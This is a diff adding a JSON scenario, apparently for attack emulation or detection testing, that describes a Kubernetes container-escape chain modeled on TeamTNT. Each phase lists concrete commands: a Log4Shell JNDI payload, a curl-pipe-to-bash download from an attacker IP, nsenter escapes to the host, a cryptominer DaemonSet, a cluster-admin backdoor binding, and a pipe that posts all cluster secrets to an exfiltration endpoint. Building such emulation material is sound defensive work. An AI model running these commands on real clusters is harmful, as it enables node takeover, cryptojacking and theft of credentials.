@@ -1,0 +1,162 @@
+{
+  "id": "sc-container-escape-001",
+  "name": "Kubernetes Container Escape to Node Compromise",
+  "description": "A full container escape attack chain targeting a misconfigured Kubernetes cluster: initial access via a vulnerable container running as root, container escape via privileged pod/hostPID abuse, node-level persistence via crontab and DaemonSet backdoor, lateral movement to the Kubernetes API server, and cluster-wide persistence via ClusterRoleBinding creation.",
+  "severity": "critical",
+  "category": "cloud_native",
+  "threat_actor": {
+    "name": "TeamTNT",
+    "aliases": ["WatchDog", "Kinsing"],
+    "origin": "Unknown",
+    "motivation": "Cryptomining, data theft, espionage",
+    "active_since": "2019"
+  },
+  "mitre_techniques_summary": [
+    "T1610", "T1611", "T1613", "T1496",
+    "T1053.003", "T1098.003", "T1552.007"
+  ],
+  "references": [
+    "https://attack.mitre.org/techniques/T1611/",
+    "https://www.trendmicro.com/en_us/research/22/e/container-escape-and-kubernetes-takeover.html",
+    "https://unit42.paloaltonetworks.com/teamtnt-operations-anarchy/"
+  ],
+  "kill_chain": ["initial_access", "execution", "privilege_escalation", "persistence", "lateral_movement", "impact"],
+  "phases": [
+    {
+      "phase": 1,
+      "name": "Initial Access via RCE in Containerized Application",
+      "description": "Attacker exploits a Log4Shell (CVE-2021-44228) vulnerability in a Java application running inside a Kubernetes pod. Remote code execution is achieved via JNDI LDAP callback to attacker-controlled server.",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "target_host": "ws-web-01",
+      "target_user": "www-data",
+      "delay_seconds": 0,
+      "stealth_level": "medium",
+      "indicators": {
+        "source_ip": "45.33.32.156",
+        "url": "https://app.corp.local/api/login",
+        "commands": [
+          "${jndi:ldap://45.33.32.156:1389/a}",
+          "curl -s http://45.33.32.156/payload.sh | bash"
+        ]
+      },
+      "ioc": {
+        "ips": ["45.33.32.156"],
+        "cve": ["CVE-2021-44228"],
+        "domains": ["log4shell.corp-attacker.xyz"]
+      }
+    },
+    {
+      "phase": 2,
+      "name": "Container Escape via Privileged Pod / hostPID",
+      "description": "The compromised pod runs as privileged with hostPID=true. The attacker uses nsenter to break out of the container namespace into the host OS, gaining root access to the Kubernetes node.",
+      "technique_id": "T1611",
+      "technique_name": "Escape to Host",
+      "tactic": "Privilege Escalation",
+      "target_host": "ws-web-01",
+      "target_user": "root",
+      "delay_seconds": 120,
+      "stealth_level": "medium",
+      "indicators": {
+        "commands": [
+          "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
+          "mount /dev/sda1 /mnt && chroot /mnt",
+          "docker run --privileged --rm -it --pid=host alpine nsenter --target 1 --mount -- sh",
+          "kubectl exec -it pod-name -- nsenter --target 1 --mount --net --pid /bin/bash"
+        ]
+      },
+      "ioc": {
+        "tools": ["nsenter", "cdk", "deepce"],
+        "events": ["Privileged container exec with nsenter targeting PID 1"]
+      }
+    },
+    {
+      "phase": 3,
+      "name": "Kubernetes API Server Enumeration",
+      "description": "With node access, the attacker reads the kubelet service account token and uses it to enumerate the Kubernetes API server: listing all pods, secrets, configmaps, and identifying RBAC misconfigurations.",
+      "technique_id": "T1613",
+      "technique_name": "Container and Resource Discovery",
+      "tactic": "Discovery",
+      "target_host": "ws-web-01",
+      "target_user": "root",
+      "delay_seconds": 120,
+      "stealth_level": "medium",
+      "indicators": {
+        "commands": [
+          "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+          "kubectl --token=$TOKEN get pods -A",
+          "kubectl --token=$TOKEN get secrets -A",
+          "kubectl --token=$TOKEN get clusterrolebindings",
+          "kubectl --token=$TOKEN auth can-i --list"
+        ]
+      }
+    },
+    {
+      "phase": 4,
+      "name": "Cryptominer Deployment via DaemonSet",
+      "description": "Attacker deploys a cryptomining DaemonSet (XMRig) that runs on every node in the cluster. The DaemonSet uses privileged containers and host network access for maximum CPU utilization.",
+      "technique_id": "T1496",
+      "technique_name": "Resource Hijacking",
+      "tactic": "Impact",
+      "target_host": "ws-web-01",
+      "target_user": "root",
+      "delay_seconds": 300,
+      "stealth_level": "low",
+      "indicators": {
+        "commands": [
+          "kubectl apply -f xmrig-daemonset.yaml",
+          "xmrig --pool pool.minexmr.com:4444 --user 4ABC...",
+          "kubectl create secret generic mining-config --from-literal=wallet=4ABC..."
+        ]
+      },
+      "ioc": {
+        "domains": ["pool.minexmr.com", "xmr.pool.minergate.com"],
+        "tools": ["XMRig", "kinsing"]
+      }
+    },
+    {
+      "phase": 5,
+      "name": "Cluster Admin Persistence via ClusterRoleBinding",
+      "description": "Attacker creates a ClusterRoleBinding granting cluster-admin to a compromised service account, establishing persistence that survives pod restarts and node reboots.",
+      "technique_id": "T1098.003",
+      "technique_name": "Account Manipulation: Additional Cloud Credentials",
+      "tactic": "Persistence",
+      "target_host": "srv-dc-01",
+      "target_user": "root",
+      "delay_seconds": 180,
+      "stealth_level": "high",
+      "indicators": {
+        "commands": [
+          "kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=default:default",
+          "kubectl create serviceaccount backdoor-sa -n kube-system",
+          "kubectl create secret docker-registry regcred --docker-server=attacker.registry.io ..."
+        ]
+      },
+      "ioc": {
+        "events": ["Kubernetes audit: ClusterRoleBinding create from unexpected SA", "Pod creation in kube-system namespace"]
+      }
+    },
+    {
+      "phase": 6,
+      "name": "Secrets Exfiltration from Kubernetes Secrets/ConfigMaps",
+      "description": "All Kubernetes secrets (database passwords, API keys, TLS certificates, AWS credentials stored as secrets) are exfiltrated to the attacker's C2 server.",
+      "technique_id": "T1552.007",
+      "technique_name": "Unsecured Credentials: Container API",
+      "tactic": "Credential Access",
+      "target_host": "srv-file-01",
+      "target_user": "root",
+      "delay_seconds": 120,
+      "stealth_level": "medium",
+      "indicators": {
+        "destination_ip": "45.33.32.156",
+        "data_size_mb": 512,
+        "external_ip": "45.33.32.156",
+        "commands": [
+          "kubectl get secrets -A -o json | curl -X POST http://45.33.32.156:8080/exfil -d @-",
+          "kubectl get configmaps -A -o json > configmaps.json"
+        ]
+      }
+    }
+  ]
+}
